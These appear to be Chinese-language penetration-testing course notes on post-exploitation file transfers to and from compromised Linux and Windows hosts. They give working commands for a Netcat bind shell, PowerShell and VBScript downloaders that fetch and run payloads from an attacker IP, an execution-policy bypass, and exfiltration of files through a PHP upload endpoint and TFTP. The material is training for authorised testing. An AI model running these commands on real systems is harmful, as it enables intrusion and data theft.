# 14-File Transfers

“post-exploitation”一词是指攻击者在获得对目标的某种程度的控制后所执行的操作。一些后攻击操作包括提升权限、将控制扩展到其他计算机、安装后门、清理攻击证据、将文件和工具上载到目标计算机等。

在本单元中，我们将探讨各种文件传输方法，这些方法可以帮助我们在特定条件下正确使用时进行评估。

## 注意事项和准备

我们在本模块中讨论的文件传输方法可能会危及我们合作的成功，应谨慎使用，并且仅在特定条件下使用。我们将在本节讨论这些条件。

我们还将讨论一些基本的准备工作，这些准备工作将有助于练习，并演示和克服标准shell在文件传输方面的一些局限性。

### 转移攻击工具的危险

在某些情况下，我们可能需要将攻击工具和工具转移到我们的目标。然而，转移这些工具可能有几个危险。

首先，我们的post-exploitation攻击工具可能会被恶意方滥用，从而使客户端的资源处于危险之中。评估完成后上传和删除文档非常重要。

其次，反病毒软件扫描端点文件系统以寻找预定义的文件签名，在这一阶段成为我们的一大挫折。这个软件在大多数公司环境中无处不在，它将检测我们的攻击工具，隔离它们（使它们变得无用），并向系统管理员发出警报。

如果系统管理员很勤奋，这将使我们损失一个宝贵的内部远程shell，或者在极端情况下，这意味着我们的合作有效结束。虽然防病毒规避超出了本模块的范围，但我们将在另一个模块中详细讨论此主题。

一般来说，我们应该始终尝试在受损系统上使用本机工具。或者，当本机工具不足时，当我们确定检测风险最小化时，或者当我们的需要大于检测的风险时，我们可以上传额外的工具。

### 安装Pure-FTPd

为了适应本模块中的练习，让我们在Kali攻击机器上快速安装Pure-FTPd服务器。如果已经在Kali系统上配置了FTP服务器，可以跳过这些步骤。

```
sudo apt update && sudo apt install pure-ftpd
```

在任何客户机连接到我们的FTP服务器之前，我们需要为Pure FTPd创建一个新用户。以下Bash脚本将为我们自动创建用户：

```
#!/bin/bash

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```

我们将使脚本可执行，然后运行它，并在提示时输入“soft98”作为offec用户的密码(密码可以自定义，只要后边用的时候对应的密码改一下就可以了)：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606210695275-1d25fc8c-d68c-4a22-8ba2-a52770e2c2ab.png)

### 非交互式Shell

大多数类似于Netcat的工具都提供了一个非交互式shell，这意味着需要用户输入的程序（如许多文件传输程序或su和sudo）往往工作得很差（如果有的话）。非交互shell也缺少一些有用的特性，比如标签页完成和作业控制。一个例子将有助于说明这个问题。

希望您熟悉ls命令。此命令是非交互式的，因为它可以在无需用户交互的情况下完成。

相比之下，考虑从Debian客户端到Kali系统的典型FTP登录会话：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606224717161-6548930e-60e3-4b0a-b7a1-11f81c3ad425.png)

在这个会话中，我们输入用户名和密码，只有在输入bye命令之后，进程才会退出。这是一个交互式程序；需要用户干预才能完成。

尽管这个问题在这一点上可能很明显，但是让我们尝试通过一个非交互shell（在本例中是Netcat）来进行FTP会话。

首先，让我们假设我们已经破坏了一个Debian客户机，并获得了对Netcat bind shell的访问权。我们将在Debian客户端上启动Netcat，监听端口4444，以模拟：

```
nc -lvnp 4444 -e /bin/bash
```

从我们的Kali系统中，我们将连接到侦听shell并再次尝试FTP会话：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606224959743-61879112-07d8-4271-9243-4f4158d73f8a.png)

在幕后，我们正在与FTP服务器交互，但是在shell中没有收到任何反馈。这是因为FTP会话（交互程序）的标准输出在基本bind或reverse shell中没有正确重定向。这会导致我们失去对shell的控制，我们不得不用ctrl+c完全退出它。在评估过程中，这可能会很有问题。

#### 升级非交互式Shell

既然我们了解了非交互式shell的一些局限性，那么让我们来看看如何“升级”shell，使其更有用。Python解释器经常安装在Linux系统上，它附带一个名为pty的标准模块，允许创建伪终端。通过使用此模块，我们可以从远程shell生成一个单独的进程，并获得一个完全交互式的shell。让我们试试这个。

我们将重新连接到我们的侦听Netcat shell，并生成pty shell：

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606225300611-ac5ac0b2-3d87-4a9d-ac50-bb3c773e5b5e.png)

这次，我们与FTP服务器的交互连接成功，退出后，我们返回到升级的Bash提示符。该技术通过传统的非交互通道有效地提供了一个交互式shell，是Linux上最流行的标准非交互shell升级之一。

## 使用Windows主机传输文件

在类Unix的环境中，我们经常会发现一些工具，如Netcat、curl或wget，它们都是预先安装在操作系统中的，这使得从远程计算机下载文件变得相对简单。然而，在Windows机器上，这个过程通常不是那么简单。在本节中，我们将探讨基于Windows的计算机上的文件传输选项。

### 非交互式FTP下载

Windows操作系统附带一个默认FTP客户端，可用于文件传输。正如我们所看到的，FTP客户端是一个交互式程序，需要输入才能完成，因此我们需要一个创造性的解决方案，以便使用FTP进行文件传输。

ftp帮助选项（-h）有一些可能对我们有所帮助的线索：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606225836337-884da130-5187-4a0e-8b69-b983fccbbaf3.png)

ftp -s选项接受一个基于文本的命令列表，它可以有效地使客户机成为非交互的。在我们的攻击机器上，我们将设置一个FTP服务器，并从受损的Windows主机启动Netcat二进制文件的下载请求。

首先，我们会放一份nc.exe在我们的/ftphome目录中：

```
sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
```

我们已经在Kali机器上安装并配置了Pure FTPd，但我们将重新启动它以确保服务可用：

```
sudo systemctl restart pure-ftpd
```

命令文件以open命令开头，该命令启动到指定IP地址的FTP连接。接下来，脚本将使用用户命令验证为offsec，并提供密码soft98。此时，我们应该有一个成功验证的FTP连接，我们可以编写传输文件所需的命令脚本。

我们将使用bin请求二进制文件传输，并使用bye命令发出关闭连接的GET请求：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606226663041-b68e2dd2-39a4-408a-adea-58e0957a9306.png)

我们现在可以使用命令列表启动FTP会话，这将有效地使交互式会话成为非交互式会话。为此，我们将发出以下FTP命令：

```
ftp -v -n -s:ftp.txt
```

在上面的清单中，我们使用-v来抑制任何返回的输出，-n用于禁止自动登录，使用-s来指示命令文件的名称。

当ftp命令运行时，我们的下载应该已经执行，并且nc.exe文件应出现在当前目录中：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606226731585-3ace5d88-5482-4c4b-af8d-12fa0c92d877.png)

### 使用脚本语言的Windows下载

我们可以利用vbscript（在windowsxp2003中）和PowerShell（在windows7 2008及更高版本中）等脚本引擎将文件下载到我们的受害者机器上。例如，以下一组非交互式回显命令,当粘贴到远程shell中时，将写出一个充当简单HTTP下载器的脚本：

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget. vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

我们可以运行这个（使用cscript）从我们的Kali机器下载文件：

```
cscript wget.vbs http://10.211.55.4/evil.exe evil.exe
```

对于最新版本的Windows，我们可以使用PowerShell作为更简单的下载替代方案。下面的示例显示了使用System.Net.WebClientPowerShell class。

```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.211.55.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

现在我们可以使用PowerShell运行脚本并下载我们的文件。但是，为了确保正确和秘密地执行，我们在脚本的执行中指定了许多选项。

首先，我们必须允许使用ExecutionPolicy关键字和Bypass值执行PowerShell脚本（默认情况下受限制）。接下来，我们将分别使用-NoLogo和-NonInteractive来隐藏PowerShell徽标横幅并抑制交互式PowerShell提示。-NoProfile关键字将阻止PowerShell加载默认配置文件（这是不需要的），最后我们使用-File指定脚本文件：

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro file -File wget.ps1
```

我们也可以将此脚本作为一行程序执行，如下所示：

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/ /10.211.55.4/evil.exe', 'new-exploit.exe')
```

如果我们想再次使用PowerShell来执行脚本，我们可以不用保存它System.Net.Webclient class。这是通过将DownloadString方法与Invoke-Expression cmdlet（IEX）相结合来实现的。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606228027808-952d1a72-ac41-4d83-81b7-774817828200.png)

接下来，我们将使用以下命令在受损的Windows计算机上运行脚本：

```
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(' http://10.11.0.4/helloworld.ps1')
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606228128684-8986bca2-1b9f-49c2-b607-be720612f72e.png)

PowerShell脚本的内容是从我们的Kali机器上下载并成功执行的，没有保存到受害者的硬盘上。

### 带exe2hex和PowerShell的Windows下载

在本节中，我们将采取一种有点迂回但非常有趣的路径，以便将二进制文件从Kali下载到受损的Windows主机。从Kali机器开始，我们将压缩要传输的二进制文件，将其转换为十六进制字符串，并将其嵌入到Windows脚本中。

在Windows机器上，我们将把这个脚本粘贴到shell中并运行它。它将把十六进制数据重定向到父进程，它将把它重新组装成二进制文件。这将通过一系列非交互式命令完成。

举个例子，让我们用powershell.exe通过远程shell将Netcat从Kali Linux机器传输到Windows客户端。

我们将从定位和检查nc.exe文件文件在Kali Linux上。

```
locate nc.exe | grep binaries
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606231580650-1447f13f-3917-4d11-8d26-62b3cc9c4db0.png)

复制到当前目录：

```
cp /usr/share/windows-resources/binaries/nc.exe .
```

虽然二进制文件已经很小了，但是我们将减小文件大小以显示它是如何完成的。我们将使用upx，一个可执行的打包机（也称为PE压缩工具）：

```
upx -9 nc.exe
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606231629614-917029b0-20cb-427e-912a-5b8e8a5c3c44.png)

如我们所见，upx优化了nc.exe文件减少了近50%。尽管尺寸较小，但windowspe文件仍然可以正常运行。

现在我们的文件已经优化，可以传输了，我们可以转换nc.exe文件在Windows计算机上运行的Windows脚本（.cmd），它将文件转换为十六进制并指示powershell.exe把它重新组装成二进制文件。我们将在转换过程中使用优秀的exe2hex工具：

```
exe2hex -x nc.exe -p nc.cmd
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606231760350-5486e788-ddfb-440c-9aa9-f677920b9037.png)

注意这个脚本中的大多数命令是非交互式的，主要由echo命令组成。在脚本的末尾，我们找到了重建nc.exe文件目标计算机上的可执行文件：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606231804947-e3c09726-bea7-4e8b-a0b4-3776d9dc2f9a.png)

当我们将这个脚本复制并粘贴到Windows机器上的一个shell中并运行它时，我们可以看到它确实创建了一个完美工作的原始副本nc.exe文件.

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606232077427-ddcbd88a-dee6-4969-97de-8f20b01180f0.png)

### 使用Windows脚本的Windows上传

在某些情况下，我们可能需要使用Windows客户端从目标网络中过滤数据。这可能很复杂，因为标准的TFTP、FTP和HTTP服务器在默认情况下很少在Windows上启用。

幸运的是，如果允许出站HTTP流量，我们可以使用System.Net.WebClient类来通过httppost请求将数据上传到Kali机器。

为此，我们可以创建以下PHP脚本并将其另存为upload.php在我们的Kali webroot目录中，/var/www/html：

```
<?php 
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) 
?>
```

PHP代码将处理一个传入的文件上载请求，并将传输的数据保存到/var/www/uploads/目录中。

接下来，我们必须创建uploads文件夹并修改其权限，授予www-data 用户所有权和后续写入权限：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606232453513-8f77e0ff-2b7f-4dc8-8ca3-8b92f6a50b1b.png)

请注意，这将允许任何人与上传.php上传文件到我们的卡利虚拟机。

当Apache和PHP脚本准备好接收我们的文件后，我们移动到受损的Windows主机并从System.Net.WebClient类来上载要进行筛选的文档，在本例中，是一个名为important.txt:

```
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11 .0.4/upload.php', 'important.txt')
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606232718307-6f8b1dff-8af1-43f4-a139-dfe28334d02b.png)

### 用TFTP上传文件

虽然上面显示的基于Windows的文件传输方法适用于自Windows 7和Windows Server 2008 R2之后的所有Windows版本，当遇到旧的操作系统时，我们可能会遇到问题。PowerShell虽然功能非常强大并且经常使用，但默认情况下不会安装在诸如windowsxp和windowsserver2003这样的操作系统上，这些操作系统仍然可以在一些生产网络中找到。虽然VBScript和FTP客户端都存在并且可以工作，但在本节中，我们将讨论另一种在该领域可能有效的文件传输方法。

tftp是一种基于UDP的文件传输协议，通常受到公司出口防火墙规则的限制。

在渗透测试期间，我们可以使用TFTP将文件从旧的Windows操作系统传输到windowsxp和2003。对于非交互式文件传输来说，这是一个非常好的工具，但在运行Windows7、Windows2008和更新版本的系统上，默认情况下不会安装它。

基于这些原因，TFTP在大多数情况下并不是一个理想的文件传输协议，但是在适当的情况下，它有它的优点。

在学习如何使用TFTP传输文件之前，我们首先需要在Kali中安装和配置TFTP服务器，并创建一个目录来存储和服务文件。接下来，我们更新目录的所有权，以便可以向其写入文件。我们将atftpd作为UDP端口69上的守护程序运行，并指示它使用新创建的/tftp目录：

```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

在Windows系统上，我们将使用-i运行tftp客户机来指定二进制图像传输、Kali系统的IP地址、启动上载的put命令以及要上载的文件的文件名。

最后一个命令类似于：

```
tftp -i 10.211.55.4 put important.txt
```

关于一些令人难以置信的有趣的方法来使用通用的Windows实用程序进行文件操作、程序执行、UAC旁路等等，请参阅Oddvar Moe和几个贡献者维护的Living Off the Land Binaries and Scripts（LOLBAS）项目，该项目旨在“记录每个二进制文件、脚本和可用于[这些]技术的库，例如certutil.exe程序可以轻松下载任意文件等。

> LOLBAS：https://github.com/LOLBAS-Project/LOLBAS